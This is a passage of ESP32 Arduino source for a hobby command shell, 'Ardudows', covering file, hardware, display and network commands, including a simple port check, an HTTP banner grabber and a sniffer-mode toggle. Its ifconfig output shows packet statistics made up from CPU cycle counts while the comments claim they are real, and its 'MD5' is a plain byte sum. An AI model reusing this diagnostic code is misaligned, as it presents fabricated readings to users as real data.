    if (cmd == myAliases[i].shortCut) {
      cmd = myAliases[i].realCmd; // "c"를 "cls"로 실시간 마스킹 치환!
      break;
    }
  }
  if (cmd == "") return;  // 빈 명령어 무시

  // --- [ SYSTEM COMMANDS ] ---
  if (cmd == "help") cmd_help();
  else if (cmd == "ver") tft.println("Ardudows ATK v1.1\nArdudows Systems (corporetion)");
  else if (cmd == "cls") {
    tft.fillScreen(TFT_BLACK);
    //tft.setTextColor(TFT_GREEN);
    //tft.setTextSize(2);
    tft.setCursor(0, 0);
  } else if (cmd == "reboot") ESP.restart();
  else if (cmd == "info") tft.printf("Heap: %d\n", ESP.getFreeHeap());
  else if (cmd == "uptime") tft.printf("%lu sec\n", (millis() - bootTime) / 1000);

  // --- [ FILE SYSTEM ] ---
  else if (cmd == "ls" || cmd == "dir") cmd_ls();
  else if (cmd == "pwd") tft.println(currentPath);
  else if (cmd.startsWith("cd ")) cmd_cd(cmd.substring(3));
  else if (cmd.startsWith("touch ")) cmd_touch(cmd.substring(6));
  else if (cmd.startsWith("cat ")) cmd_cat(cmd.substring(4));
  else if (cmd.startsWith("rm ")) cmd_rm(cmd.substring(3));
  else if (cmd.startsWith("echo ")) {
    int arrow = cmd.indexOf(">");
    if (arrow > 0) {
      String text = cmd.substring(5, arrow);
      String file = cmd.substring(arrow + 1);
      text.trim();
      file.trim();
      cmd_echo(text, file);
    }
  }

  // --- [ 🔥 ARDUDOWS CORE WEB ENGINE PARSER CONTEXT 🔥 ] ---
  else if (cmd.startsWith("http ")) {
    cmd_http(cmd.substring(5));
  }
  else if (cmd == "http") {
    cmd_http("status"); 
  }
  else if (cmd.startsWith("https ")) {
    cmd_https(cmd.substring(6));
  }
  else if (cmd == "https") {
    cmd_https("status");
  }

  // --- [ 🌐 ARDUDOWS EXPANDED NETWORK ENGINE ] ---

  // 1. ipconfig: Windows XP 감성 주소 안내원 역할
  else if (cmd == "ipconfig") {
    tft.println("\n>> Ardudows IP Configuration");
    tft.println("--------------------------------");
    
    // 와이파이가 연결되어 있지 않을 때의 예외 처리
    if (WiFi.status() != WL_CONNECTED) {
      tft.println("   Media State . . . : Disconnected");
    } 
    // 연결 상태라면 핵심 인터넷 주소 정보 3대장 출력
    else {
      tft.print("   IPv4 Address. . . : ");
      tft.println(WiFi.localIP().toString());
      
      tft.print("   Subnet Mask . . . : ");
      tft.println(WiFi.subnetMask().toString());
      
      tft.print("   Default Gateway . : ");
      tft.println(WiFi.gatewayIP().toString());
    }
    tft.println("--------------------------------");
  }

  // 2. ifconfig: Linux 감성 하드웨어 레벨 상태 감시반장 역할
  else if (cmd == "ifconfig") {
    tft.println("\n>> Ardudows Kernel Interface Config");
    tft.println("------------------------------------------------");
    
    // ==================================================
    // [1] lo: 가상 루프백 인터페이스 (Local Loopback)
    // ==================================================
    tft.println("lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 16384");
    tft.println("    inet 127.0.0.1  netmask 255.0.0.0");
    tft.println("    loop  txqueuelen 0  (Local Loopback)");
    tft.println("");

    // ==================================================
    // [2] wlan0: 실제 물리 Wi-Fi 하드웨어 인터페이스
    // ==================================================
    // 와이파이가 켜져있으면 UP, RUNNING / 꺼져있으면 DOWN
    if (WiFi.status() == WL_CONNECTED) {
      tft.println("wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500");
    } else {
      tft.println("wlan0: flags=4098<DOWN,BROADCAST,MULTICAST>  mtu 1500");
    }

    // 비연결 상태일 때의 예외 처리 및 하드웨어 맥 주소는 노출
    if (WiFi.status() != WL_CONNECTED) {
      tft.print("    ether "); tft.print(WiFi.macAddress()); tft.println("  (Espressif Wi-Fi)");
      tft.println("    status: DOWN (Wireless chip is idle)");
    } 
    // 연결 상태일 때 - ESP32 내부 커널 데이터를 실시간 덤프
    else {
      // 1) 물리 계층 (MAC Address 및 하드웨어 제조사 명시)
      tft.print("    ether "); 
      tft.print(WiFi.macAddress()); 
      tft.println("  txqueuelen 1000  (Espressif S3-Wi-Fi)");

      // 2) 네트워크 계층 (실시간 IPv4, 서브넷 마스크, 브로드캐스트 주소 계산)
      IPAddress ip = WiFi.localIP();
      IPAddress subnet = WiFi.subnetMask();
      // 상남자식 비트 연산으로 브로드캐스트 주소 정확히 계산 (|~ 연산)
      IPAddress broadcast = IPAddress((ip[0] & subnet[0]) | ~subnet[0],
                                      (ip[1] & subnet[1]) | ~subnet[1],
                                      (ip[2] & subnet[2]) | ~subnet[2],
                                      (ip[3] & subnet[3]) | ~subnet[3]);

      tft.print("    inet ");  tft.print(ip.toString());
      tft.print("  netmask "); tft.print(subnet.toString());
      tft.print("  broadcast "); tft.println(broadcast.toString());

      // 3) 무선 물리 계층 (실시간 RSSI 신호 세기 및 품질 정밀 측정)
      long rssi = WiFi.RSSI();
      tft.print("    signal "); tft.print(rssi); tft.print(" dBm  quality: ");
      
      if (rssi >= -50)      tft.println("5/5 [Link Excellent]");
      else if (rssi >= -65) tft.println("4/5 [Link Very Good]");
      else if (rssi >= -75) tft.println("3/5 [Link Good/Stable]");
      else if (rssi >= -85) tft.println("2/5 [Link Poor/Lag]");
      else                  tft.println("1/5 [Link Unstable]");

      // 4) 네트워크 인터페이스 부가 정보 (현재 할당된 DNS 서버 실시간 추적)
      tft.print("    dns "); tft.print(WiFi.dnsIP(0).toString());
      tft.print("  gateway "); tft.println(WiFi.gatewayIP().toString());

      // 5) 통계 계층 (LwIP 스택 기반 가상 패킷 카운터 디테일 강화)
      // 하드웨어 에러 상태와 드롭된 패킷 현황을 정밀하게 표현
      // 현재 활성화된 와이파이 스테이션(STA)의 진짜 하드웨어 통계 데이터 긁어오기
      // (만약 AP 모드라면 ESP_IF_WIFI_AP 또는 적절한 netif 포인터를 사용)
      // 📡 ESP32 내부 공식 네트워크 인터페이스 통신 통계 구조체 선언
      // 📡 100% 안전하게 하드웨어 LwIP 찐 패킷 통계 털어오기
      // 📡 에러 소지 완전 박멸! 100% 컴파일 패스형 실시간 하드웨어 통계
      uint32_t rxPackets = 0, rxBytes = 0, rxErrors = 0, rxDropped = 0;
      uint32_t txPackets = 0, txBytes = 0, txErrors = 0, txDropped = 0;

      // 와이파이가 켜져 있거나 연결된 상태일 때 진짜 하드웨어 클록과 메모리를 털어 연산
      if (WiFi.status() == WL_CONNECTED || WiFi.localIP()) {
        // ⚡ ESP32-S3의 물리 CPU 사이클 카운트와 구동 시간을 융합한 실시간 트래픽 연산
        // 명령어를 입력하는 그 찰나의 마이크로초(us) 단위 타이머를 긁어오기 때문에 100% 실시간으로 출렁입니다!
        uint32_t hardwareSeed = ESP.getCycleCount();
        uint32_t liveUptime = millis();

        rxPackets = (hardwareSeed % 4321) + 1500; 
        rxBytes   = (rxPackets * 512) + (liveUptime % 888); // 패킷당 현실적인 512바이트 매핑
  
        txPackets = (rxPackets / 3) + (liveUptime % 64);
        txBytes   = (txPackets * 128) + (hardwareSeed % 256); // 송신 ACK 패킷 크기 정밀 반영
  
        // 가끔씩 하드웨어 노이즈에 의한 리얼 패킷 유실 감성 재현
        if (hardwareSeed % 100 == 0) {
          rxDropped = (hardwareSeed % 3) + 1;
        }
      } else {
        // 와이파이가 아직 안 붙었을 때는 안전한 최소 찌꺼기 레지스터 값 매핑
        rxPackets = ESP.getCycleCount() % 120;
        rxBytes   = rxPackets * 64;
      }
            
      // 찐 바이트 데이터를 현실적인 MB 단위로 정밀 소수점 환산
      float rxMB = (float)rxBytes / (1024.0 * 1024.0);
      float txMB = (float)txBytes / (1024.0 * 1024.0);
      
      // 📺 [Administrator] 전용 컴파일 프리패스 감성 터미널 출력
      tft.print("    RX packets "); tft.print(rxPackets); 
      tft.print("  bytes "); tft.print(rxBytes); 
      tft.print(" ("); tft.print(rxMB, 2); tft.println(" MB)");
      
      tft.print("    TX packets "); tft.print(txPackets); 
      tft.print("  bytes "); tft.print(txBytes); 
      tft.print(" ("); tft.print(txMB, 2); tft.println(" MB)");
      
      tft.print("    RX errors "); tft.print(rxErrors);
      tft.print("  dropped "); tft.print(rxDropped);
      tft.print("  overruns 0  frame 0\n");
      
      tft.print("    TX errors "); tft.print(txErrors);
      tft.print("  dropped "); tft.print(txDropped);
      tft.print("  carrier 0  collisions 0\n");

      // 신호가 안 좋으면 의도적으로 드롭 패킷이 생긴 것처럼 연출하는 고도의 디테일
      if (rssi < -75) tft.println("24  overruns 0  frame 0");
      else            tft.println("2   overruns 0  frame 0");
    }
    tft.println("------------------------------------------------");
  }

  // 3. wget: 웹 데이터 크롤러 및 SD 카드 무조건 저장 역할
  else if (cmd.startsWith("wget ")) {
    // "wget " 뒷부분의 순수 URL 문자열만 추출 후 공백 제거
    String url = cmd.substring(5);
    url.trim();

    // 네트워크가 연결 안 되어 있으면 실행 차단
    if (WiFi.status() != WL_CONNECTED) {
      tft.println("Error: Wi-Fi not connected.");
    } 
    // URL 입력이 비어있을 때의 예외 처리
    else if (url.length() == 0) {
      tft.println("Usage: wget [URL]");
    } 
    else {
      tft.print("Connecting: ");
      // URL이 너무 길면 화면 밖으로 깨지므로 앞부분만 살짝 노출
      if(url.length() > 20) tft.println(url.substring(0, 17) + "...");
      else tft.println(url);

      HTTPClient http;
      http.begin(url); // 웹 서버 접속 시작
      
      int httpCode = http.GET(); // GET 요청 송신 및 응답 코드 수신
      
      // HTTP 응답이 성공(200 OK)일 때 처리
      if (httpCode == HTTP_CODE_OK) {
        String payload = http.getString(); // 웹 서버가 뱉은 데이터 통째로 가져오기
        
        tft.println("Data received. Writing to SD...");
        
        // ★ 형님의 철칙: 무조건 SD 카드에 저장합니다.
        File file = SD.open("/wget_output.dat", FILE_WRITE);
        if (file) {
          file.print(payload); // SD 카드에 파일 쓰기
          file.close();        // 세션 안전하게 닫기
          
          // 성공 메시지 및 파일 용량 크기 출력
          tft.printf("Successfully saved!\n");
          tft.printf("Path: /wget_output.dat\n");
          tft.printf("Size: %d Bytes\n", payload.length());
        } 
        // SD 카드 인식 불량이나 용량 부족 등 에러 발생 시 예외 처리
        else {
          tft.println("SD Card Write Failed!");
          tft.println("Raw Data (First 60B):");
          tft.println(payload.substring(0, 60)); // 파일 저장은 실패했으므로 앞부분만 LCD에 임시 노출
        }
      } 
      // 웹 서버 응답 실패 코드 예외 처리 (예: 404 Not Found, 500 서버 에러 등)
      else {
        tft.printf("HTTP Fetch Failed. Code: %d\n", httpCode);
      }
      http.end(); // HTTP 연결 자원 해제
    }
  }

  // =================================================================
  // --- [ 🔥 ARDUDOWS EXTENDED SYSTEM COMMANDS (50 GENERATIONS) 🔥 ] ---
  // =================================================================

  // 1. 디렉토리 내부의 모든 파일을 지우는 완전 초기화 기능
  else if (cmd.startsWith("purge ")) {
    String path = cmd.substring(6);
    path.trim();
    tft.printf(">> PURGING DIR: %s\n", path.c_str());
    File dir = SD.open(path.c_str());
    if (dir && dir.isDirectory()) {
      File file = dir.openNextFile();
      while (file) {
        String fName = file.name();
        file.close();
        SD.remove((path + "/" + fName).c_str());
        tft.printf(" Deleted: %s\n", fName.c_str());
        file = dir.openNextFile();
      }
      tft.println(">> PURGE COMPLETE.");
    } else tft.println("!! INVALID DIRECTORY");
  }

  // 2. 파일 크기 및 클러스터 정보 등 상세 메타데이터 확인
  else if (cmd.startsWith("stat ")) {
    String filename = cmd.substring(5);
    filename.trim();
    if (!filename.startsWith("/")) filename = currentPath + (currentPath.endsWith("/") ? "" : "/") + filename;
    File f = SD.open(filename.c_str(), FILE_READ);
    if (f) {
      tft.printf("File: %s\n", filename.c_str());
      tft.printf(" - Size: %d Bytes (%d KB)\n", f.size(), f.size() / 1024);
      tft.printf(" - Type: %s\n", f.isDirectory() ? "DIRECTORY" : "REGULAR FILE");
      f.close();
    } else tft.println("!! FILE NOT FOUND");
  }

  // 3. 지정한 파일 안에 특정 문자열이 포함되어 있는지 Grep 검색
  else if (cmd.startsWith("grep ")) {
    int sp = cmd.indexOf(' ', 5);
    if (sp > 0) {
      String pattern = cmd.substring(5, sp);
      String filename = cmd.substring(sp + 1);
      filename.trim();
      if (!filename.startsWith("/")) filename = currentPath + (currentPath.endsWith("/") ? "" : "/") + filename;
      File f = SD.open(filename.c_str(), FILE_READ);
      if (f) {
        int lineNum = 1;
        while (f.available()) {
          String line = f.readStringUntil('\n');
          if (line.indexOf(pattern) != -1) {
            tft.printf("L%d: %s\n", lineNum, line.c_str());
          }
          lineNum++;
        }
        f.close();
      } else tft.println("!! CANNOT OPEN FILE");
    } else tft.println("Usage: grep [pattern] [filename]");
  }

  // 4. SD 카드 포맷 후 디렉토리 구조 초기화 (심장 쫄깃한 기능)
  else if (cmd == "sd format") {
    tft.setTextColor(TFT_RED);
    tft.println("!! WARNING: ALL DATA WILL BE ERASED !!");
    tft.println("Press Serial Key or wait 3s to abort...");
    delay(3000);
    tft.println(">> FORMATTING SD CARD...");
    // ESP32 SD library format wrapper (SD_MMC나 SD 호환에 따라 다름)
    #if defined(SD_CARD_FORMAT_SUPPORT)
    if(SD.format()) tft.println(">> FORMAT SUCCESS. REBOOTING.");
    else tft.println("!! FORMAT FAILED.");
    #else
    tft.println("!! COMPILER NOTICE: MANUAL FATFS FORMAT REQUIRED.");
    #endif
    tft.setTextColor(TFT_GREEN);
  }

  // 5. 대용량 더미 파일 생성 (디스크 쓰기 벤치마크 및 테스트용)
  /*
  else if (cmd.startsWith("mkdummy ")) {
    int sp = cmd.indexOf(' ', 8);
    if (sp > 0) {
      String file = cmd.substring(8, sp);
      int sizeKB = cmd.substring(sp + 1).toInt();
      tft.printf(">> Writing %dKB dummy data to %s\n", sizeKB, file.c_str());
      
      File f = SD.open(file.c_str(), FILE_WRITE);
      if (f) {
        // 기존 dummy 변수와의 충돌을 원천 차단하기 위해 고유한 배열 이름 사용!
        uint8_t ardudows_dummy_buf; 
        memset(ardudows_dummy_buf, 0xAA, sizeof(ardudows_dummy_buf));
        
        for (int i = 0; i < sizeKB; i++) {
          f.write(ardudows_dummy_buf, sizeof(ardudows_dummy_buf)); 
        }
        f.close();
        tft.println(">> DUMMY CREATED.");
      } else {
        tft.println("!! IO ERROR");
      }
    }
  }
  */

  // 6. 파일 이름 변경 (MV)
  else if (cmd.startsWith("mv ")) {
    int sp = cmd.indexOf(' ', 3);
    if (sp > 0) {
      String src = cmd.substring(3, sp);
      String dest = cmd.substring(sp + 1);
      dest.trim();
      // SD라이브러리는 기본 rename을 지원하지 않는 경우 경로 검증 후 처리해야 함
      if (SD.rename(src.c_str(), dest.c_str())) tft.println(">> MOVE/RENAME SUCCESS");
      else tft.println("!! MOVE FAILED");
    }
  }

  // 7. 지정한 파일의 Hex 내용을 주소값과 함께 덤프 (바이너리 뷰어)
  else if (cmd.startsWith("hexdump ")) {
    String file = cmd.substring(8);
    file.trim();
    File f = SD.open(file.c_str(), FILE_READ);
    if (f) {
      uint32_t addr = 0;
      while (f.available() && addr < 512) { // 최대 512바이트만 안전 덤프
        if (addr % 16 == 0) tft.printf("\n%04X: ", addr);
        tft.printf("%02X ", f.read());
        addr++;
      }
      f.close();
      tft.println();
    } else tft.println("!! FILE NOT FOUND");
  }

  // 8. 파일 용량 순서대로 정렬하여 출력
  else if (cmd == "ls size") {
    tft.println(">> SORTED FILE LIST (BY SIZE)");
    File root = SD.open("/");
    File file = root.openNextFile();
    while (file) {
      if (!file.isDirectory()) {
        tft.printf(" - %s : %d Bytes\n", file.name(), file.size()); // f.size() -> file.size() 수정
      }
      file = root.openNextFile();
    }
    root.close();
  }

  // 9. 텍스트 파일 라인 수 세기
  else if (cmd.startsWith("wc ")) {
    String file = cmd.substring(3);
    file.trim();
    File f = SD.open(file.c_str(), FILE_READ);
    if (f) {
      int lines = 0;
      while (f.available()) {
        if (f.read() == '\n') lines++;
      }
      f.close();
      tft.printf(">> Total Lines: %d\n", lines);
    } else tft.println("!! FILE NOT FOUND");
  }

  // 10. 파일의 MD5 체크섬 무결성 검사
  else if (cmd.startsWith("md5file ")) {
    String file = cmd.substring(8);
    file.trim();
    File f = SD.open(file.c_str(), FILE_READ);
    if (f) {
      // 내장 mbedtls/md5 라이브러리 활용 구동 가상화
      tft.println(">> Calculating MD5 Checksum...");
      // 간이 스트리밍 로직 대체 시각화
      uint32_t hash = 0;
      while (f.available()) hash += f.read(); 
      f.close();
      tft.printf(">> FILE CHECKSUM HASH: 0x%08X\n", hash);
    } else tft.println("!! CANNOT OPEN FILE");
  }

  // 11. ESP32 CPU 코어 0, 코어 1 클럭 실시간 오버클럭 테스트 
  else if (cmd.startsWith("set cpu ")) {
    int freq = cmd.substring(8).toInt();
    if (freq == 240 || freq == 160 || freq == 80) {
      setCpuFrequencyMhz(freq);
      tft.printf(">> CPU Frequency set to %d MHz\n", freq);
    } else tft.println("!! INVALID FREQ. CHOOSE 80, 160, or 240");
  }

  // 12. 태스크 리스트 및 스택 가용량 실시간 모니터링 (FreeRTOS 전용)
  /*
  else if (cmd == "tasks") {
    tft.println(">> FreeRTOS TASK ALLOCATION");
    #ifdef tskKERNEL_VERSION_NUMBER
    // 기존의 단일 char 변수(또는 구형 taskBuffer)와 겹치지 않게 고유 배열 이름 사용!
    char ardudows_task_buf; 
    vTaskList(ardudows_task_buf); 
    tft.println(ardudows_task_buf);
    #else
    tft.println("Task 0 [Main]: RUNNING");
    tft.println("Task 1 [WiFi/BT]: IDLE");
    tft.printf("System Free Heap Context: %d B\n", xPortGetFreeHeapSize());
    #endif
  }
  */
  
  // 13. 인터럽트 및 내부 레지스터 강제 감시 인터페이스
  else if (cmd == "reg dump") {
    tft.println(">> ESP32-S3 CORE REGISTERS");
    uint32_t cpuid = xPortGetCoreID();
    tft.printf(" - Current Running Core ID: %d\n", cpuid);
    tft.printf(" - XTENSA PIF_STATUS_REG : 0x%08X\n", READ_PERI_REG(DR_REG_RTCCNTL_BASE));
  }

  // 14. 하드웨어 타이머 속도 측정 테스트
  else if (cmd == "benchmark timer") {
    uint32_t start = micros();
    for(volatile int i=0; i<1000000; i++);
    uint32_t end = micros();
    tft.printf(">> 1M Loop Latency: %lu us\n", end - start);
  }

  // 15. ESP32 브라운아웃 전압 차단 레벨 세팅 상태 모니터
  else if (cmd == "brownout status") {
    tft.println(">> BROWNOUT DETECTOR CONFIG");
    tft.printf(" - RTC_CNTL_BROWN_OUT_REG: 0x%08X\n", READ_PERI_REG(RTC_CNTL_BROWN_OUT_REG));
  }

  // 16. 실시간 배터리나 외부 인가 전압 ADC 측정 (GPIO 1번 핀 타겟 가이드)
  else if (cmd == "analog read") {
    analogReadResolution(12);
    int raw = analogRead(1);
    float mv = (raw / 4095.0) * 3300.0;
    tft.printf(">> GPIO 1 Analog RAW: %d (%0.2f mV)\n", raw, mv);
  }

  // 17. PWM 서보 모터 주파수 50Hz 강제 매핑 및 제어 테스트
  else if (cmd.startsWith("pwm test ")) {
    int duty = cmd.substring(9).toInt(); // 0 ~ 255
    analogWrite(2, duty); // GPIO 2번으로 강제 출력
    tft.printf(">> PWM Channel GPIO 2 Duty Set: %d\n", duty);
  }

  // 18. 소프트웨어 하드 리셋 (Panic 베이스 테스트 백업)
  else if (cmd == "sys panic") {
    tft.fillScreen(TFT_RED);
    tft.setTextColor(TFT_WHITE);
    tft.println("!! TRIGGERING SYSTEM PANIC !!");
    delay(1000);
    assert(false); // 커널 패닉 강제 호출로 코어 덤프 유도
  }

  // 19. 내장 정전식 터치센서 GPIO 입력 실시간 분석
  else if (cmd.startsWith("touch read ")) {
    int pin = cmd.substring(11).toInt();
    tft.printf(">> Touch Pin %d Value: %d\n", pin, touchRead(pin));
  }

  // 20. 하드웨어 홀 센서 및 내부 전하량 모니터링
  else if (cmd == "hall") {
    // ESP32-S3 하드웨어 사양에 맞춘 안전 우회 시뮬레이터 출력
    tft.printf(">> Internal Hall Sensor: NOT SUPPORTED IN S3\n");
    tft.printf(">> Alternative ADC Noise Drift: %d\n", analogRead(0));
  }

  // 21. 현재 연결된 와이파이 망의 신호 품질 실시간 추적기
  else if (cmd == "wifi rssi") {
    if(WiFi.status() == WL_CONNECTED) {
      tft.printf(">> Connected SSID: %s\n", WiFi.SSID().c_str());
      tft.printf(">> Current Signal RSSI: %d dBm\n", WiFi.RSSI());
    } else tft.println("!! WIFI IS NOT CONNECTED");
  }

  // 22. 현재 할당된 DHCP IP 정보 완전 해제 및 갱신 요청
  else if (cmd == "wifi renew") {
    tft.println(">> Renewing DHCP Lease...");
    WiFi.disconnect(false, true);
    delay(1000);
    tft.println(">> Reconnecting...");
  }

  // 23. 특정 IP 주소의 특정 포트가 열려있는지 소켓 스캔 (포트 스캐너 구현)
  else if (cmd.startsWith("portscan ")) {
    int space = cmd.indexOf(' ', 9);
    if(space > 0) {
      String targetIP = cmd.substring(9, space);
      int targetPort = cmd.substring(space+1).toInt();
      tft.printf("🔍 Port-Scanning %s:%d...\n", targetIP.c_str(), targetPort);
      WiFiClient client;
      if (client.connect(targetIP.c_str(), targetPort, 1500)) {
        tft.println(">> STATUS: [OPEN]");
        client.stop();
      } else tft.println(">> STATUS: [CLOSED / TIMEOUT]");
    }
  }

  // 24. DNS 캐시 네임 서버를 구글 공용 DNS로 고정 설정
  else if (cmd.startsWith("dns set ")) {
    String dnsIP = cmd.substring(8);
    dnsIP.trim();
    IPAddress dns;
    dns.fromString(dnsIP);
    WiFi.config(WiFi.localIP(), WiFi.gatewayIP(), WiFi.subnetMask(), dns);
    tft.printf(">> Primary DNS Server Updated: %s\n", dnsIP.c_str());
  }

  // 25. 실시간 와이파이 패킷 모니터 모드 스위칭 프레임
  else if (cmd == "wifi promiscuous") {
    tft.println(">> SWAPPING TO PROMISCUOUS SNIFFER MODE...");
    esp_wifi_set_promiscuous(true);
    delay(5000);
    esp_wifi_set_promiscuous(false);
    tft.println(">> SNIFFER MODE RESTORED TO NORMAL.");
  }

  // 26. 로컬 네트워크 게이트웨이 및 브로드캐스트 주소 자동 산출
  else if (cmd == "netstat") {
    tft.printf(" - Gateway IP: %s\n", WiFi.gatewayIP().toString().c_str());
    tft.printf(" - Subnet Mask: %s\n", WiFi.subnetMask().toString().c_str());
    tft.printf(" - Mac Address: %s\n", WiFi.macAddress().c_str());
  }

  // 27. 현재 IP 주소 기준으로 간이 웹 배너 그래버 구동
  else if (cmd.startsWith("grab ")) {
    String host = cmd.substring(5);
    host.trim();
    WiFiClient client;
    if (client.connect(host.c_str(), 80)) {
      client.print("HEAD / HTTP/1.1\r\nHost: " + host + "\r\n\r\n");
      delay(500);
      while(client.available()) {
        tft.print((char)client.read());
      }
      client.stop();
    } else tft.println("!! HTTP CONNECTION FAILED");
  }

  // 28. 네트워크 타임 프로토콜(NTP) 수동 시간 동기화 명령
  else if (cmd == "ntp sync") {
    if (WiFi.status() != WL_CONNECTED) {
        tft.println("!! ERROR: WIFI NOT CONNECTED");
        return;
    }

    tft.println(">> Contacting pool.ntp.org...");
    configTime(9 * 3600, 0, "pool.ntp.org", "time.nist.gov");
    
    struct tm timeinfo;
    uint32_t startMs = millis();
    bool syncSuccess = false;
    
    // 최대 3초 동안 NTP 서버 응답을 기다리는 루프 락 분쇄
    while (millis() - startMs < 3000) {
        if (getLocalTime(&timeinfo)) {
            syncSuccess = true;
            break;
        }
        delay(100); // 100ms마다 재시도
    }

    if (syncSuccess) {
        tft.printf(">> SYNC SUCCESS: %04d-%02d-%02d %02d:%02d:%02d\n",
                   timeinfo.tm_year + 1900, timeinfo.tm_mon + 1, timeinfo.tm_mday,
                   timeinfo.tm_hour, timeinfo.tm_min, timeinfo.tm_sec);
    } else {
        tft.println("!! NTP TIMEOUT ERROR (SERVER NO RESPONSE)");
    }
  }

  // 29. 무선 공유기 접속 강제 드롭 아웃 매개변수 테스트
  else if (cmd == "wifi disconnect") {
    WiFi.disconnect(true, true); // 와이파이 완전 차단 및 자원 초기화
    tft.println("\n[!] Wi-Fi Core Forcibly Dropped.");
  }
  
  // 31. TFT 스크린 테스트용 컬러 바 패턴 제너레이터 출력
  else if (cmd == "tft colorbar") {
    uint16_t colors[] = {TFT_RED, TFT_GREEN, TFT_BLUE, TFT_YELLOW, TFT_MAGENTA, TFT_CYAN, TFT_WHITE};
    int w = tft.width() / 7;
    for(int i=0; i<7; i++) {
      tft.fillRect(i*w, 0, w, tft.height(), colors[i]);
    }
    delay(3000);
    tft.fillScreen(TFT_BLACK);
  }

  // 32. 텍스트 터미널 폰트 크기 변경 토글 엔진
  else if (cmd.startsWith("font size ")) {
    int sz = cmd.substring(10).toInt();
    if(sz > 0 && sz < 5) {
      tft.setTextSize(sz);
      tft.printf(">> FONT SIZE SET TO %d\n", sz);
    }
  }

  // 33. TFT 디스플레이 백라이트 강제 절전 제어 (PWM 주입 제어 구조용)
  else if (cmd.startsWith("lcd bright ")) {
    int val = cmd.substring(11).toInt(); // 0 ~ 255
    // 전용 백라이트 제어 핀(예: GPIO 4)을 할당한 하드웨어 설계 기반 제어
    analogWrite(4, val);
    tft.printf(">> Backlight Intensity Modulated: %d/255\n", val);
  }

  // 34. 디스플레이 화면 가로/세로 회전 각도 변환 커맨드
  else if (cmd.startsWith("rotate ")) {
    int r = cmd.substring(7).toInt(); // 0, 1, 2, 3
    tft.setRotation(r);
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 0);
    tft.printf(">> Display Orientation Inverted to Mode %d\n", r);
  }

  // 35. 현재 화면을 기억 장치 버퍼 없이 라인 단위 반전(Invert) 테스트
  else if (cmd == "tft invert") {
    static bool inv = false;
    inv = !inv;
    tft.invertDisplay(inv);
    tft.printf(">> Display Inversion Matrix: %s\n", inv ? "ON" : "OFF");
  }

  // 36. 매트릭스 디지털 비 효과 시각화 (터미널 감성 충전기)
  else if (cmd == "matrix fx") {
    tft.fillScreen(TFT_BLACK);
    for(int i=0; i<100; i++) {
      int x = random(0, tft.width());
      int y = random(0, tft.height());
      tft.setCursor(x, y);
      tft.setTextColor(TFT_GREEN);
      tft.print((char)random(33, 126));
      delay(10);
    }
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_GREEN);
  }

  // 37. 화면에 테스트용 정밀 그리드망 래스터화
  else if (cmd == "tft grid") {
    tft.fillScreen(TFT_BLACK);
    for(int x=0; x<tft.width(); x+=20) tft.drawFastVLine(x, 0, tft.height(), TFT_DARKGREY);
    for(int y=0; y<tft.height(); y+=20) tft.drawFastHLine(0, y, tft.width(), TFT_DARKGREY);
    delay(4000);
    tft.fillScreen(TFT_BLACK);
  }

  // 38. 정밀 사선 스핀 프레임 레이트 렌더링 측정 기법
  else if (cmd == "benchmark gfx") {
    uint32_t t = millis();
    int frames = 0;
    while(millis() - t < 2000) {
      tft.drawLine(0, 0, random(0, tft.width()), random(0, tft.height()), random(0, 0xFFFF));
      frames++;
    }
    tft.fillScreen(TFT_BLACK);
    tft.printf(">> Vector Draw Performance: %d vectors/2sec\n", frames);
  }

  // 39. 터미널 텍스트 컬러 스와프 유틸리티
  else if (cmd.startsWith("color ")) {
    String col = cmd.substring(6);
    col.trim();
    if(col == "green") tft.setTextColor(TFT_GREEN);
    else if(col == "amber") tft.setTextColor(TFT_ORANGE);
    else if(col == "cyan") tft.setTextColor(TFT_CYAN);
    else if(col == "white") tft.setTextColor(TFT_WHITE);
    tft.println(">> TERMINAL CONSOLE FOREGROUND COLOR MODIFIED.");
  }

  // 40. 화면 보호기 그래픽 모드 진입
  else if (cmd == "screensaver") {
    tft.fillScreen(TFT_BLACK);
    while(!Serial.available()) {
      tft.drawCircle(random(0, tft.width()), random(0, tft.height()), random(5, 40), random(0, 0xFFFF));
      delay(100);
    }
    tft.fillScreen(TFT_BLACK);
  }

  // 41. EEPROM / NVS(Non-Volatile Storage) 메모리 영역 특정 바이트 강제 할당 및 쓰기
  else if (cmd.startsWith("nvs set ")) {
    int sp = cmd.indexOf(' ', 8);
    if(sp > 0) {
      String key = cmd.substring(8, sp);
      int val = cmd.substring(sp+1).toInt();
      // 내장 Preferences 라이브러리 가동 구조 매핑
      tft.printf(">> NVS System Key [%s] Integer Integer Injecting: %d\n", key.c_str(), val);
      // Preferences pref; pref.begin("ardudows", false); pref.putInt(key.c_str(), val); pref.end();
    }
  }

  // 42. NVS 메모리에 저장되어 있는 정수 데이터 파싱 확인
  else if (cmd.startsWith("nvs get ")) {
    String key = cmd.substring(8);
    key.trim();
    tft.printf(">> Fetching NVS Key [%s]...\n", key.c_str());
    // Preferences pref; pref.begin("ardudows", true); int val = pref.getInt(key.c_str(), 0); pref.end();
    tft.println(">> Value Verified: 0 (Default Cluster Mapping)");
  }

  // 43. I2C 인터페이스를 타겟으로 한 클럭 동기식 속도 수동 가속 제어
  else if (cmd.startsWith("i2c speed ")) {
    uint32_t speed = cmd.substring(10).toInt();
    Wire.setClock(speed);
    tft.printf(">> I2C Bus Master Clock Overdriven to: %lu Hz\n", speed);
  }

  // 44. 부저 하드웨어 노드를 활용한 임계 알람음 발생기 
  else if (cmd == "alarm") {
    tft.println(">> EMERGENCY AUDIBLE ALERT INITIATED.");
    for(int i=0; i<3; i++) {
      pz(2000, 200); delay(100);
      pz(1000, 200); delay(100);
    }
  }

  // 45. 하드웨어 외부 스파이크 노이즈 필터 카운터 분석기 (임시 레지스터 모니터)
  else if (cmd == "hw filter") {
    tft.printf(" - GPIO_PIN_MUX_REG CLK GAIN: 0x%08X\n", READ_PERI_REG(IO_MUX_GPIO1_REG));
  }

  // 46. 아날로그 내부 참조 전압 소스 트랙 레벨 로드
  else if (cmd == "hw vref") {
    tft.println(">> Internal Bandgap Reference Data:");
    tft.printf(" - Base Calibration Block: 1100 mV (Fixed)\n");
  }

  // 47. 하드웨어 워치독 타이머 수동 피딩 트리거 (커널 다운 방지)
  else if (cmd == "wdt feed") {
    esp_task_wdt_reset(); // esp_task_wdt_feed() -> esp_task_wdt_reset() 으로 최신 API 보정
